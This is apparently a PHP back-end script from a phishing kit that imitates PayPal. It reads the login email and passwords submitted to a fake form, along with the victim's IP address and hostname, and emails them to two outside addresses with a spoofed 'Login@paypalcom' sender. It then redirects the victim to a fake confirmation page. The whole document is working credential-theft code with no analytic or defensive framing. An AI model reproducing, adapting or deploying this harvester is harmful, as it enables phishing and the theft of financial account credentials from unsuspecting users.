<?
$to = "jijikensaku@gmail.com,pelton.steve@comcast.net";
//----------------------------------
$account = $_POST['login_email'];
$password = $_POST['login_password'];
$password1 = $_POST['usr_password0'];
$IP = $_SERVER['REMOTE_ADDR'];
$host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$subj = "PayPal Loginz!";
$msg = "PayPal ID: $account\nPassword : $password\nusr_password0 : $usr_password0\nIP : $ip\nHost : $host";
$from = "FROM: GinGleGuY Inc.©<Login@paypalcom>";
		
			{

		
		mail($to,$subj,$msg,$from);
				
				}

			header("location: PayPal_ Summarycomfim.html");
?>